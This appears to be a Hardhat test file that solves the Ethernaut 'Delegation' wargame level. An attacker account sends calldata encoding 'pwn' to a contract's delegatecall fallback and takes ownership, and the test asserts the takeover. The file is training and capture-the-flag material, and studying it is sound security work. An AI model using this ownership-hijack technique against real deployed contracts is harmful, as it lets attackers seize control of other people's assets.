import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {Delegate, Delegation} from '../../types/typechain/';

describe('Ethernaut 6: Delegation', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  let delegateContract: Delegate;
  let delegationContract: Delegation;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    delegateContract = await ethers.getContractFactory('Delegate', owner).then(f => f.deploy(owner.address));
    await delegateContract.deployed();

    delegationContract = await ethers
      .getContractFactory('Delegation', owner)
      .then(f => f.deploy(delegateContract.address));
    await delegationContract.deployed();

    expect(await delegationContract.owner()).to.eq(owner.address);
  });

  it('should claim ownership', async () => {
    await attacker.sendTransaction({
      from: attacker.address,
      to: delegationContract.address,
      data: delegateContract.interface.encodeFunctionData('pwn'),
    });
  });

  after(async () => {
    // attacker should be the new owner
    expect(await delegationContract.owner()).to.eq(attacker.address);
  });
});
